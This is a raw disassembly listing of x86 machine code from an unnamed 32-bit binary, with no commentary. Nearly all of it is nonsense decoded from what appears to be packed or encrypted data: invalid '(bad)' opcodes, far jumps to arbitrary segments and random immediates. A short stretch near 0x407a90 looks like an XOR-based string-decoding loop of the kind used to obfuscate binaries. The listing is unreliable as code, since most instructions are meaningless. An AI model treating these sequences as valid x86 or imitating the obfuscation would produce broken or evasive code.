  40789b:	or     BYTE PTR [ebx+edx*8+0x3c],cl
  40789f:	push   es
  4078a0:	lods   eax,DWORD PTR ds:[esi]
  4078a1:	imul   ecx,DWORD PTR [ebx],0xffffffa4
  4078a4:	(bad)  
  4078a5:	jnp    0x407888
  4078a7:	or     DWORD PTR [edi+0x5b],esi
  4078aa:	jmp    0x519f44a
  4078af:	mov    al,ds:0xda575b9e
  4078b4:	mov    al,0x9e
  4078b6:	outs   dx,BYTE PTR ds:[esi]
  4078b7:	sub    al,0x91
  4078b9:	iret   
  4078ba:	jmp    0x40784d
  4078bc:	data16 sbb al,0x99
  4078bf:	imul   eax,ecx,0x1a
  4078c2:	aam    0xcb
  4078c4:	mov    ebx,DWORD PTR [edx-0x25fe58a7]
  4078ca:	call   DWORD PTR [ebx]
  4078cc:	pop    DWORD PTR [ecx]
  4078ce:	cs (bad) 
  4078d0:	popf   
  4078d1:	jmp    0xe216e340
  4078d6:	imul   edx,DWORD PTR [eax-0xaab7e11],0x8498a7be
  4078e0:	stos   BYTE PTR es:[edi],al
  4078e1:	add    bl,BYTE PTR [ecx+0x4d8101c7]
  4078e7:	push   ebp
  4078e8:	test   eax,0x22b41bd4
  4078ed:	cmp    eax,0xf3bf24c2
  4078f2:	lds    edi,FWORD PTR [edi-0x629fa58f]
  4078f8:	jl     0x407881
  4078fa:	stos   DWORD PTR es:[edi],eax
  4078fb:	jno    0x4078b9
  4078fd:	or     BYTE PTR [edx+0x22],cl
  407900:	inc    ebp
  407901:	leave  
  407902:	adc    eax,0xfdef0152
  407907:	jae    0x407890
  407909:	bound  esi,QWORD PTR [ebx-0x1655899]
  40790f:	xlat   BYTE PTR ds:[ebx]
  407910:	jnp    0x40792c
  407912:	jo     0x4078a8
  407914:	sbb    dh,bl
  407916:	int3   
  407917:	xor    al,0x8b
  407919:	shl    BYTE PTR [edx],cl
  40791b:	in     al,0xff
  40791d:	xchg   DWORD PTR [ebp-0x39],edi
  407920:	sahf   
  407921:	mov    esp,0x7dfee2a9
  407926:	xor    al,0x39
  407928:	in     eax,0x9f
  40792a:	mov    eax,ds:0x75fa5f0c
  40792f:	pop    ss
  407930:	sbb    al,BYTE PTR es:[ebx]
  407933:	mov    eax,ds:0xded79e16
  407938:	aas    
  407939:	xchg   ebp,eax
  40793a:	jmp    0xff14:0xd7369f53
  407941:	dec    esi
  407942:	mov    dl,0x70
  407944:	jae    0x4078f7
  407946:	lods   eax,DWORD PTR ds:[esi]
  407947:	mov    es,edi
  407949:	sbb    dl,dh
  40794b:	mov    ebp,0xff7696f
  407950:	mov    ebx,0xb306dd1b
  407955:	inc    edx
  407956:	popf   
  407957:	ins    BYTE PTR es:[edi],dx
  407958:	loope  0x40790d
  40795a:	dec    esp
  40795b:	mov    ah,0xc5
  40795d:	mov    edx,0x877c92e0
  407962:	nop
  407963:	push   ebp
  407964:	or     eax,DWORD PTR [esi-0x71784f6f]
  40796a:	xchg   ecx,eax
  40796b:	(bad)  
  40796c:	xor    DWORD PTR [ebx+0x6],esi
  40796f:	xchg   DWORD PTR [edx+0x527613a6],edx
  407975:	dec    ebx
  407976:	pop    ebx
  407977:	pop    esi
  407978:	shl    edx,cl
  40797a:	imul   esi,DWORD PTR [ebx+0x4e325ba8],0xd3ef142b
  407984:	sub    eax,0x108f48ae
  407989:	mov    edi,0x47549d9f
  40798e:	aas    
  40798f:	dec    esp
  407990:	jmp    0x4f33:0xe4834533
  407997:	jmp    0x40795b
  407999:	mov    eax,0x3d3bcb3e
  40799e:	mov    edx,0xf505b6a8
  4079a3:	mov    bh,0x9f
  4079a5:	repnz ror DWORD PTR [edx],0x49
  4079a9:	push   edx
  4079aa:	loope  0x40792d
  4079ac:	xor    DWORD PTR [esi-0x6e010136],eax
  4079b2:	rcl    BYTE PTR [ebx-0x5c],cl
  4079b5:	jp     0x4079fd
  4079b7:	dec    esp
  4079b8:	adc    ch,BYTE PTR [esi]
  4079ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079bb:	inc    esp
  4079bc:	sub    BYTE PTR [esi-0x4b9129e8],dh
  4079c2:	or     al,0x15
  4079c4:	mov    esi,0x6b171cec
  4079c9:	push   edx
  4079ca:	adc    DWORD PTR [ebp+0x3a33e941],0x5636de87
  4079d4:	push   es
  4079d5:	mov    ds,WORD PTR [edi+ecx*8-0x8e4cd19]
  4079dc:	mov    esi,0x8ad39be9
  4079e1:	int3   
  4079e2:	mov    dl,0xd7
  4079e4:	and    BYTE PTR [ebx+0x794ec7d2],dh
  4079ea:	adc    eax,0x8999da0
  4079ef:	dec    ebx
  4079f0:	scas   al,BYTE PTR es:[edi]
  4079f1:	fistp  QWORD PTR [eax]
  4079f3:	xchg   edi,eax
  4079f4:	mov    ch,0xaf
  4079f6:	ret    
  4079f7:	xor    eax,0xbc2f1ac4
  4079fc:	loope  0x407a10
  4079fe:	mov    ch,0x92
  407a00:	scas   eax,DWORD PTR es:[edi]
  407a01:	jl     0x407a21
  407a03:	leave  
  407a04:	xchg   BYTE PTR [edx+esi*8-0x58],bh
  407a08:	cmp    DWORD PTR [ecx+edx*4],0xb
  407a0c:	sti    
  407a0d:	retf   0x700d
  407a10:	loop   0x407a18
  407a12:	test   BYTE PTR [edx+0x37],cl
  407a15:	push   esp
  407a16:	cmc    
  407a17:	mov    ch,0xac
  407a19:	inc    ecx
  407a1a:	mov    esp,0xd17e9e3a
  407a1f:	push   es
  407a20:	pop    ss
  407a21:	pop    ebx
  407a22:	add    dh,BYTE PTR [edx]
  407a24:	lods   eax,DWORD PTR ds:[esi]
  407a25:	(bad)  
  407a26:	mov    ?,esp
  407a28:	das    
  407a29:	push   ecx
  407a2a:	stos   DWORD PTR es:[edi],eax
  407a2b:	lds    ecx,FWORD PTR [ecx+ebx*4]
  407a2e:	in     eax,dx
  407a2f:	leave  
  407a30:	sbb    al,0x80
  407a32:	sti    
  407a33:	repz mov esp,0x580b3ccd
  407a39:	ret    
  407a3a:	imul   ebx,DWORD PTR [edi],0x19
  407a3d:	js     0x8530feef
  407a43:	out    dx,eax
  407a44:	mov    ch,0xb1
  407a46:	mov    WORD PTR [esi+eiz*2],ds
  407a49:	inc    edx
  407a4a:	int    0x3f
  407a4c:	jmp    0x7b3f:0x86f8abe8
  407a53:	sahf   
  407a54:	and    al,0xaa
  407a56:	(bad)  
  407a57:	scas   eax,DWORD PTR es:[edi]
  407a58:	loop   0x4079ea
  407a5a:	jb     0x407a3c
  407a5c:	or     eax,0xe327ce94
  407a61:	cmp    edi,DWORD PTR [ecx]
  407a63:	ds inc ebp
  407a65:	mov    fs,esi
  407a67:	call   0x2b30:0x23b21360
  407a6e:	fst    QWORD PTR [ebx]
  407a70:	ins    BYTE PTR es:[edi],dx
  407a71:	(bad)  
  407a72:	retf   
  407a73:	sub    ch,BYTE PTR [edi]
  407a75:	push   0x10f3f2a3
  407a7a:	and    DWORD PTR [esi+0x21],esp
  407a7d:	add    edx,DWORD PTR [eax]
  407a7f:	ret    0xbe5e
  407a82:	push   ds
  407a83:	add    al,0xae
  407a85:	outs   dx,BYTE PTR ds:[esi]
  407a86:	out    dx,al
  407a87:	repz jmp 0x366:0x78edb6c1
  407a8f:	(bad)  
  407a90:	movzx  eax,ax
  407a93:	mov    DWORD PTR [ebp-0x14],eax
  407a96:	mov    eax,DWORD PTR [ebp+0x8]
  407a99:	movzx  eax,WORD PTR [eax+edx*4]
  407a9d:	xor    eax,0x8a36
  407aa2:	add    eax,edi
  407aa4:	mov    edi,DWORD PTR [ebp-0x14]
  407aa7:	mov    BYTE PTR [ebp+edi*1-0x58],al
  407aab:	mov    eax,DWORD PTR [ebp-0xc]
  407aae:	inc    edx
  407aaf:	jmp    0x407db8
  407ab4:	ror    ebp,0xd6
  407ab7:	retf   
  407ab8:	fcmove st,st(3)
  407aba:	rcl    ebp,1
  407abc:	adc    edx,DWORD PTR [esi+0x3c]
  407abf:	xchg   esp,eax
  407ac0:	cli    
  407ac1:	(bad)  
  407ac2:	cmp    al,0x8e
  407ac4:	pushf  
  407ac5:	fstp   TBYTE PTR [eax+0x78]
  407ac8:	fs jle 0x407b43
  407acb:	js     0x407b0e
  407acd:	test   cl,cl
  407acf:	into   
  407ad0:	nop
  407ad1:	dec    esi
  407ad2:	xor    BYTE PTR [eax],dh
  407ad4:	call   0x7b76:0x7110d046
  407adb:	jbe    0x407af9
  407add:	dec    BYTE PTR [edi]
  407adf:	adc    DWORD PTR ds:0x96aa1518,edi
  407ae5:	aaa    
  407ae6:	in     eax,0x68
  407ae8:	pop    ss
  407ae9:	lea    ebp,[ecx]
  407aeb:	punpckhdq mm6,QWORD PTR [ebx+0x1e]
  407aef:	(bad)  
  407af0:	pop    edx
  407af1:	frstor [edx-0x7be676ea]
  407af7:	std    
  407af8:	iret   
  407af9:	and    eax,0xd169e7b2
  407afe:	or     DWORD PTR [ecx],0x188fa9b8
  407b04:	mov    ?,WORD PTR [edx*2+0x418cd27d]
  407b0b:	inc    esi
  407b0c:	cld    
  407b0d:	stc    
  407b0e:	jecxz  0x407aad
  407b10:	push   ebx
  407b11:	in     al,0x8c
  407b13:	sbb    BYTE PTR [ebx+0x24668ba6],bh
  407b19:	nop
  407b1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b1b:	out    dx,al
  407b1c:	stos   DWORD PTR es:[edi],eax
  407b1d:	dec    DWORD PTR [esp+edx*1]
  407b20:	mov    al,ds:0xbac42410
  407b25:	sbb    al,0x44
  407b27:	inc    eax
  407b28:	call   0xfb99:0xe6a66c8e
  407b2f:	mov    ss,WORD PTR fs:[edx]
  407b32:	sbb    eax,0x7edb5440
  407b37:	lahf   
  407b38:	dec    ecx
  407b39:	aas    
  407b3a:	jg     0x407b72
  407b3c:	fwait
  407b3d:	push   esi
  407b3e:	ins    BYTE PTR es:[edi],dx
  407b3f:	clc    
  407b40:	scas   al,BYTE PTR es:[edi]
  407b41:	bound  esi,QWORD PTR [esi+0x79]
  407b44:	mov    ds,WORD PTR [edi+0x1207faa]
  407b4a:	mov    ?,WORD PTR [esp+ecx*4+0x78de3967]
  407b51:	pop    ds
  407b52:	cmp    ebp,DWORD PTR [ebx-0x626ce0b3]
  407b58:	je     0x407b9f
  407b5a:	sbb    eax,0x7410f3ec
  407b5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b60:	mov    cl,0x9a
  407b62:	sub    BYTE PTR [esi+esi*4-0x6],0xe7
  407b67:	add    eax,0xf1823570
  407b6c:	adc    edi,ecx
  407b6e:	out    dx,eax
  407b6f:	not    DWORD PTR [edi-0xa]
  407b72:	retfw  0xf417
  407b76:	pop    ecx
  407b77:	mov    ah,0x98
  407b79:	push   ecx
  407b7a:	and    bh,BYTE PTR [eax+ebx*2+0x4f]
  407b7e:	dec    eax
  407b7f:	ret    
  407b80:	test   BYTE PTR [ecx+0x6916f839],0x7a
  407b87:	or     BYTE PTR [edx+ebx*8],al
  407b8a:	fs inc ecx
  407b8c:	mov    ds:0xf5e07f9e,eax
  407b91:	in     eax,0x83
  407b93:	out    0xdc,eax
  407b95:	icebp  
  407b96:	das    
  407b97:	scas   eax,DWORD PTR es:[edi]
  407b98:	inc    ecx
  407b99:	fst    st(0)
  407b9b:	cmp    esi,ebx
  407b9d:	arpl   WORD PTR [eax+0x10007bbd],bx
  407ba3:	scas   eax,DWORD PTR es:[edi]
  407ba4:	sub    edx,DWORD PTR [ebx-0x9]
  407ba7:	cs mov ecx,0xcf4d93b9
  407bad:	gs dec esi
  407baf:	xor    al,0x1a
  407bb1:	mov    ebx,0x64ea3dc8
  407bb6:	jno    0x407be9
  407bb8:	fmul   DWORD PTR [eax]
  407bba:	fwait
  407bbb:	pop    ecx
  407bbc:	jl     0x407bc4
  407bbe:	jb     0x407c20
  407bc0:	aad    0x6f
  407bc2:	scas   eax,DWORD PTR es:[edi]
  407bc3:	push   0xf914d5f1
  407bc8:	mov    ds:0xa532a8ae,al
  407bcd:	sahf   
  407bce:	sahf   
  407bcf:	hlt    
  407bd0:	(bad)  
  407bd1:	push   cs
  407bd2:	vpaddb xmm7,xmm3,XMMWORD PTR [edi+0x50]
  407bd7:	pop    ebp
  407bd8:	jno    0x407c3f
  407bda:	xlat   BYTE PTR ds:[ebx]
  407bdb:	push   0xffffffa6
  407bdd:	dec    esp
  407bde:	cmp    eax,0xe6778b29
  407be3:	jmp    0xb451:0xa44cbeb1
  407bea:	mov    BYTE PTR [edx+eax*2+0x2fb062ea],ah
  407bf1:	mov    dl,dl
  407bf3:	adc    bl,BYTE PTR [edx+0x62]
  407bf6:	lods   eax,DWORD PTR ds:[esi]
  407bf7:	test   bl,al
  407bf9:	in     al,dx
  407bfa:	rcl    bh,1
  407bfc:	inc    esp
  407bfd:	dec    edi
  407bfe:	das    
  407bff:	repnz cmp ebx,DWORD PTR [ebp-0x7fe654]
  407c06:	aas    
  407c07:	cmp    eax,0x42e408e2
  407c0c:	mov    BYTE PTR [edx+0x3b9abad8],bh
  407c12:	je     0x407c48
  407c14:	mov    esp,0xe9e53b4f
  407c19:	sub    ecx,DWORD PTR [ecx+0x53]
  407c1c:	cwde   
  407c1d:	mov    dl,0x4
  407c1f:	sar    BYTE PTR [esi+0x38],1
  407c22:	push   ds
  407c23:	sub    BYTE PTR [ecx+0xa],bl
  407c26:	mov    eax,ds:0x352b0d8e
  407c2b:	dec    ebx
  407c2c:	hlt    
  407c2d:	pop    ecx
  407c2e:	jl     0x407bfd
  407c30:	push   ds
  407c31:	cs jg  0x407bee
  407c34:	enter  0xd65f,0xc6
  407c38:	test   DWORD PTR [edx],edx
  407c3a:	adc    eax,0x338ce0ca
  407c3f:	dec    edx
  407c40:	sbb    al,0x32
  407c42:	fbstp  TBYTE PTR [ebx-0x31b3dd23]
  407c48:	loop   0x407c4b
  407c4a:	cwde   
  407c4b:	dec    ebx
  407c4c:	(bad)  
  407c4d:	mov    bh,0x80
  407c4f:	sti    
  407c50:	xchg   ebx,esi
  407c52:	shl    ebx,cl
  407c54:	or     ah,bl
  407c56:	dec    edx
  407c57:	out    dx,al
  407c58:	xor    al,0xb7
  407c5a:	cld    
  407c5b:	mov    dl,0x9c
  407c5d:	cld    
  407c5e:	sahf   
  407c5f:	mov    al,0xcd
  407c61:	loop   0x407c5d
  407c63:	sbb    DWORD PTR [ebx+0x53104aa0],ebp
  407c69:	loop   0x407ce6
  407c6b:	mov    ds:0x507edd5c,al
  407c70:	xchg   ebx,eax
  407c71:	adc    eax,0xb46a0e53
  407c76:	dec    esp
  407c77:	push   0x854324be
  407c7c:	dec    eax
  407c7d:	out    0xff,eax
  407c7f:	mov    ecx,0x5085410e
  407c84:	adc    al,0x9b
  407c86:	iret   
  407c87:	call   0xa39f:0x86ed571d
  407c8e:	lock xchg edi,eax
  407c90:	jb     0x407cda
  407c92:	xchg   ecx,eax
  407c93:	test   eax,0x65b18190
  407c98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c99:	push   ebp
  407c9a:	mov    al,0xab
  407c9c:	pop    es
  407c9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c9e:	mov    ebx,0x132d231b
  407ca3:	jnp    0x407cdf
  407ca5:	fisttp WORD PTR [ebx]
  407ca7:	xchg   DWORD PTR ds:0x19abdef9,ebp
  407cad:	cld    
  407cae:	sbb    al,0xfb
  407cb0:	loopne 0x407cbf
  407cb2:	(bad)  
  407cb3:	xchg   ecx,eax
  407cb4:	xor    BYTE PTR [ebp-0x78597ede],bl
  407cba:	pop    edi
  407cbb:	(bad)  
  407cbc:	add    DWORD PTR [ebx-0x2e73a404],ebp
  407cc2:	lods   eax,DWORD PTR ds:[esi]
  407cc3:	in     eax,dx
  407cc4:	clc    
  407cc5:	repnz or al,0x6d
  407cc8:	mov    bl,dh
  407cca:	call   FWORD PTR [esi+0x27048d95]
  407cd0:	xor    ecx,DWORD PTR [eax-0x2c]
  407cd3:	scas   al,BYTE PTR es:[edi]
  407cd4:	xchg   ecx,eax
  407cd5:	int    0x4a
  407cd7:	jp     0x407cb9
  407cd9:	mov    edx,0x744aa4c8
  407cde:	sbb    DWORD PTR [edi+0x787b20aa],0xffffffd7
  407ce5:	rol    DWORD PTR [ecx],1
  407ce7:	pop    edx
  407ce8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ce9:	movaps xmm7,XMMWORD PTR [ecx+eiz*8+0x3422953d]
  407cf1:	rcr    eax,1
  407cf3:	call   FWORD PTR [ebx-0x69]
  407cf6:	mov    WORD PTR [esi],gs
  407cf8:	pop    edx
  407cf9:	push   ecx
  407cfa:	cmp    BYTE PTR [eax+0x6f],ch
  407cfd:	cmp    ecx,DWORD PTR [ecx+0x63]
  407d00:	add    al,0x41
  407d02:	je     0x407d4c
  407d04:	xor    bh,BYTE PTR [edx-0x467d8efc]
  407d0a:	add    ah,bl
  407d0c:	mov    ds:0xc216c459,eax
  407d11:	or     DWORD PTR [ecx-0x27858d19],esp
  407d17:	pmulhuw mm1,QWORD PTR [ecx-0x7]
  407d1b:	dec    ebx
  407d1c:	inc    edx
  407d1d:	push   ebp
  407d1e:	push   ecx
  407d1f:	rol    ah,cl
  407d21:	add    BYTE PTR [esi],ch
  407d23:	sub    ah,dh
  407d25:	les    ebx,FWORD PTR [eax+0x1c]
  407d28:	dec    esp
  407d29:	dec    ecx
  407d2a:	out    0x67,eax
  407d2c:	cmp    DWORD PTR [eax],edi
  407d2e:	jge    0x407d49
  407d30:	or     al,0x6d
  407d32:	jl     0x407cfd
  407d34:	call   0x5638:0x951a970c
  407d3b:	mov    cl,BYTE PTR [ebp-0x3ac126ce]
  407d41:	mov    ds:0x38bd6930,al
  407d46:	iret   
  407d47:	sub    bl,BYTE PTR [eax]
  407d49:	fldcw  WORD PTR [edx+esi*4-0x76]
  407d4d:	push   esp
  407d4e:	push   eax
  407d4f:	(bad)  
  407d50:	fdiv   QWORD PTR [ebp-0x67]
  407d53:	pop    ds
  407d54:	mov    eax,0xd227c610
  407d59:	dec    ecx
  407d5a:	mov    ebx,0xda168312
  407d5f:	pop    ecx
  407d60:	mov    al,0xd8
  407d62:	(bad)  
  407d64:	rol    BYTE PTR [esp+ebx*8+0x74],1
  407d68:	jns    0x407d03
  407d6a:	xlat   BYTE PTR ds:[ebx]
  407d6b:	into   
  407d6c:	add    DWORD PTR [esi+edx*1-0xc9627fe],ebx
  407d73:	add    cl,BYTE PTR [ecx+ebp*4-0x6b]
  407d77:	loopne 0x407d16
  407d79:	mov    WORD PTR ds:0xbf83232a,fs
  407d7f:	sub    dl,BYTE PTR [ebx-0x40]
  407d82:	pop    edi
  407d83:	dec    ebx
  407d84:	inc    esi
  407d85:	cld    
  407d86:	loopne 0x407dfe
  407d88:	push   eax
  407d89:	mov    al,0x55
  407d8b:	fnsave [ecx]
  407d8d:	sahf   
  407d8e:	add    DWORD PTR [ecx-0x2d],edi
  407d91:	adc    BYTE PTR [edx-0x661581a1],0xd4
  407d98:	xchg   ebp,eax
  407d99:	(bad)  
  407d9a:	je     0x407de7
  407d9c:	adc    al,0xbe
  407d9e:	inc    esp
  407d9f:	cmc    
  407da0:	clc    
  407da1:	test   eax,0x813442a6
  407da6:	stos   BYTE PTR es:[edi],al
  407da7:	sbb    ecx,edi
  407da9:	jg     0x407d4d
  407dab:	es inc ebx
  407dad:	lods   al,BYTE PTR ds:[esi]
  407dae:	adc    cl,BYTE PTR [ebp+esi*1+0x5]
  407db2:	dec    ebp
  407db3:	pop    ss
  407db4:	dec    eax
  407db5:	in     eax,0x97
  407db7:	cwde   
  407db8:	cmp    edx,eax
  407dba:	jne    0x407772
  407dc0:	pop    edi
  407dc1:	pop    ebx
  407dc2:	mov    eax,DWORD PTR [ebp-0x8]
  407dc5:	mov    edx,DWORD PTR [ebp+0x10]
  407dc8:	jmp    0x4080d1
  407dcd:	retf   0xd73f
  407dd0:	ret    0xdad9
  407dd3:	fld    st(7)
  407dd5:	add    BYTE PTR [eax+0x7c],bl
  407dd8:	fsubr  DWORD PTR [edi]
  407dda:	push   esi
  407ddb:	test   eax,0x78d8888f
  407de0:	js     0x407e46
  407de2:	jle    0x407e5c
  407de4:	js     0x407dfd
  407de6:	xor    bh,BYTE PTR [esp+edi*1+0x68]
  407dea:	aad    0xcb
  407dec:	jnp    0x407dde
  407dee:	jl     0x407dc7
  407df0:	jl     0x407db1
  407df2:	(bad)  
  407df3:	lock scas eax,DWORD PTR es:[di]
  407df6:	mov    eax,ds:0x5b38715
  407dfb:	dec    esi
  407dfc:	jnp    0x407dba
  407dfe:	or     dl,BYTE PTR [edi]
  407e00:	rcr    DWORD PTR es:[ebp-0x7d5ec042],1
  407e07:	push   ebp
  407e08:	mov    ah,BYTE PTR [eax]
  407e0a:	jno    0x407e67
  407e0c:	stos   DWORD PTR es:[edi],eax
  407e0d:	and    DWORD PTR [eax],ebp
  407e0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e10:	or     dh,bl
  407e12:	adc    BYTE PTR [ecx+0x31],dh
  407e15:	push   ebx
  407e16:	mov    dh,BYTE PTR [esi+0x75]
  407e19:	fwait
  407e1a:	mov    esi,0x227b190b
  407e1f:	dec    ebp
  407e20:	popa   
  407e21:	call   0x560c99
  407e26:	or     ebx,edi
  407e28:	xchg   ebx,eax
  407e29:	(bad)  
  407e2a:	iret   
  407e2b:	jle    0x407e35
  407e2d:	cmp    DWORD PTR [edx-0x3d14d19f],ebp
  407e33:	push   ss
  407e34:	push   cs
  407e35:	rcr    BYTE PTR [edi],cl
  407e37:	dec    edi
  407e38:	push   edi
  407e39:	les    edi,FWORD PTR [eax+0x3d]
  407e3c:	cmp    esp,DWORD PTR [esi+0x52]
  407e3f:	xlat   BYTE PTR ds:[ebx]
  407e40:	jle    0x407e78
  407e42:	jb     0x407e99
  407e44:	outs   dx,BYTE PTR ds:[esi]
  407e45:	in     al,0x98
  407e47:	push   edx
  407e48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e49:	mov    edx,0x88c4afe2
  407e4e:	(bad)  
  407e4f:	mov    ebx,0xb67071bb
  407e54:	push   ebx
  407e55:	or     ecx,DWORD PTR [esi-0x3d]
  407e58:	xchg   DWORD PTR [esi+0x6a],esp
  407e5b:	fisubr DWORD PTR [eax-0x5b]
  407e5e:	out    0x3,al
  407e60:	nop
  407e61:	mov    al,ds:0x7427c8fb
  407e66:	hlt    
  407e67:	xchg   ebp,eax
  407e68:	mov    ebx,0x545ff90d
  407e6d:	lahf   
  407e6e:	lods   eax,DWORD PTR ds:[esi]
  407e6f:	inc    eax
  407e70:	std    
  407e71:	jmp    0x86e5998f
  407e76:	mov    si,0xcd9d
  407e7a:	xor    ecx,DWORD PTR [eax]
  407e7c:	fadd   st(0),st
  407e7e:	xor    esp,DWORD PTR ds:0x9f842749
  407e84:	iret   
  407e85:	popf   
  407e86:	mov    DWORD PTR [eax+0x77],esi
  407e89:	pop    eax
  407e8a:	fs in  al,dx
  407e8c:	aas    
  407e8d:	pop    ecx
  407e8e:	xor    bl,dl
  407e90:	ins    BYTE PTR es:[edi],dx
  407e91:	add    edi,ebx
  407e93:	call   DWORD PTR [ebx-0x33]
  407e96:	fs jnp 0x407f0c
  407e99:	jo     0x407f10
  407e9b:	xor    BYTE PTR [eax-0x2349ad53],cl
  407ea1:	sbb    DWORD PTR [eax],edx
  407ea3:	fbld   TBYTE PTR [esp+edi*4+0x3784f411]
  407eaa:	pop    ebx
  407eab:	popa   
  407eac:	rol    DWORD PTR [edx],0x81
  407eaf:	push   eax
  407eb0:	adc    BYTE PTR [edx],al
  407eb2:	inc    eax
  407eb3:	pop    ds
  407eb4:	or     al,ah
  407eb6:	addr16 push es
  407eb8:	adc    edx,esi
  407eba:	out    0x45,al
  407ebc:	xor    eax,0x3e042e9c
  407ec1:	mov    ch,0xff
  407ec3:	and    DWORD PTR [esi],ecx
  407ec5:	mov    eax,0x412672f5
  407eca:	in     al,dx
  407ecb:	ds pop es
  407ecd:	dec    ecx
  407ece:	iret   
  407ecf:	dec    ebx
  407ed0:	jle    0x407ea8
  407ed2:	pusha  
  407ed3:	mov    ebx,DWORD PTR [ebp+0x7]
  407ed6:	jl     0x407e89
  407ed8:	xchg   esi,eax
  407ed9:	add    al,0xb2
  407edb:	xchg   ebp,eax
  407edc:	xchg   ecx,eax
  407edd:	mov    ch,0x10
  407edf:	sbb    DWORD PTR cs:[eax+edi*2-0x3ad7fdc8],ecx
  407ee7:	or     BYTE PTR ds:0x7d466902,al
  407eed:	mov    cl,0x36
  407eef:	ret    0x48c
  407ef2:	adc    ah,cl
  407ef4:	lahf   
  407ef5:	and    dh,BYTE PTR [esi-0x3a]
  407ef8:	mov    ch,0xfa
  407efa:	add    dl,BYTE PTR [esi-0x11cce489]
  407f00:	jg     0x407f5d
  407f02:	imul   esp,DWORD PTR [ecx+0x0],0x4697887f
  407f09:	cwde   
  407f0a:	into   
  407f0b:	mov    ds:0x8216fa5f,eax
  407f10:	popw   es
  407f12:	push   esi
  407f13:	xchg   ecx,eax
  407f14:	and    eax,0xa98c0c4a
  407f19:	sub    eax,0x37c9441e
  407f1e:	xchg   BYTE PTR [edi-0x7c6ae608],al
  407f24:	jecxz  0x407f93
  407f26:	ds mov dl,0x5e
  407f29:	lods   eax,DWORD PTR ds:[esi]
  407f2a:	push   edx
  407f2b:	dec    edi
  407f2c:	and    dl,BYTE PTR [edx-0x41]
  407f2f:	fadd   DWORD PTR [esi+0x5cddf0e8]
  407f35:	sbb    BYTE PTR [ecx],al
  407f37:	jle    0x407f9d
  407f39:	lods   al,BYTE PTR ds:[esi]
  407f3a:	ss sahf 
  407f3c:	outs   dx,DWORD PTR ds:[esi]
  407f3d:	push   0x52
  407f3f:	pop    ss
  407f40:	mov    bh,0x5e
  407f42:	icebp  
  407f43:	and    edi,edi
  407f45:	or     eax,0x3d78222d
  407f4a:	iret   
  407f4b:	les    ecx,FWORD PTR [ecx+0x3e176bbf]
  407f51:	xor    BYTE PTR [ebx+ecx*8+0x57],bl
  407f55:	repz inc edx
  407f57:	bound  ecx,QWORD PTR [ebx]
  407f59:	fwait
  407f5a:	or     eax,0x9e3beca1
  407f5f:	mov    dl,bh
  407f61:	popf   
  407f62:	push   0x5f39f80d
  407f67:	fimul  WORD PTR [edi-0x1a2dffde]
  407f6d:	and    DWORD PTR [edi-0x7a],esp
  407f70:	jnp    0x407f82
  407f72:	bound  esi,QWORD PTR [ebx-0x26]
  407f75:	jle    0x407f0e
  407f77:	pop    ebx
  407f78:	pop    edx
  407f79:	inc    ecx
  407f7a:	pop    ss
  407f7b:	sbb    DWORD PTR [edi-0x52271c99],ecx
  407f81:	pop    esi
  407f82:	lds    ebp,FWORD PTR [ecx-0x3d]
  407f85:	push   esp
  407f86:	sbb    BYTE PTR [edi+0x7f],dl
  407f89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f8a:	mul    DWORD PTR [ecx-0x40]
  407f8d:	stos   BYTE PTR es:[edi],al
  407f8e:	iret   
  407f8f:	xchg   DWORD PTR [esp+ecx*1],edx
  407f92:	inc    ebx
  407f93:	cmp    al,0x8a
  407f95:	dec    edi
  407f96:	mov    dh,0x86
  407f98:	push   ss
  407f99:	cmp    DWORD PTR [ecx-0x44],eax
  407f9c:	mov    edi,0xb902c60a
  407fa1:	adc    eax,0x51695cd0
  407fa6:	stc    
  407fa7:	push   es
  407fa8:	into   
  407fa9:	dec    esp
  407faa:	pop    esi
  407fab:	push   edi
  407fac:	jae    0x407ff3
  407fae:	sbb    edx,DWORD PTR [ecx+0x409e415]
  407fb4:	ins    BYTE PTR es:[edi],dx
  407fb5:	pop    ebp
  407fb6:	fimul  WORD PTR [ecx+0x46abdbfc]
  407fbc:	cmp    BYTE PTR [ebx-0x1d],cl
  407fbf:	pop    es
  407fc0:	sub    cl,BYTE PTR [eax]
  407fc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fc3:	jno    0x407f8f
  407fc5:	jbe    0x407f9f
  407fc7:	xchg   BYTE PTR [ebx+0x546b435d],bh
  407fcd:	mov    DWORD PTR [ebp-0x52],esi
  407fd0:	fnstcw WORD PTR [edi-0x30]
  407fd3:	ds fs mov ebx,0x5ee26c76
  407fda:	xor    dl,BYTE PTR [ebp+eax*8+0x35ff5d99]
  407fe1:	popf   
  407fe2:	mov    esp,0xde14651a
  407fe7:	mov    eax,0xf3d94639
  407fec:	ret    0x31f8
  407fef:	aad    0xd7
  407ff1:	xor    eax,0xd0a5cd91
  407ff6:	jecxz  0x408000
  407ff8:	fs jbe 0x407f83
  407ffb:	xchg   esp,eax
  407ffc:	jne    0x408019
  407ffe:	xchg   ebx,eax
  407fff:	mov    edi,0x574b6612
  408004:	sub    al,0xf1
  408006:	add    al,0x27
  408008:	cmp    edx,edx
  40800a:	ins    BYTE PTR es:[edi],dx
  40800b:	lock push ss
  40800d:	ins    DWORD PTR es:[edi],dx
  40800e:	sahf   
  40800f:	aad    0xbd
  408011:	mov    ebp,es
  408013:	sbb    al,BYTE PTR [ebp+eiz*1-0x40]
  408017:	mov    cl,0x90
  408019:	stos   DWORD PTR es:[edi],eax
  40801a:	shl    dh,1
  40801c:	mov    ds:0xf483130a,al
  408021:	mov    al,BYTE PTR [ebp-0x169acdc9]
  408027:	xchg   ebp,eax
  408028:	dec    esi
  408029:	dec    eax
  40802a:	lods   al,BYTE PTR ds:[esi]
  40802b:	push   edi
  40802c:	jl     0x408009
  40802e:	scas   al,BYTE PTR es:[edi]
  40802f:	test   DWORD PTR [edi],0xa39dc625
  408035:	push   ds
  408036:	pop    ebp
  408037:	data16 in al,0x94
  40803a:	mov    edx,0x4747041b
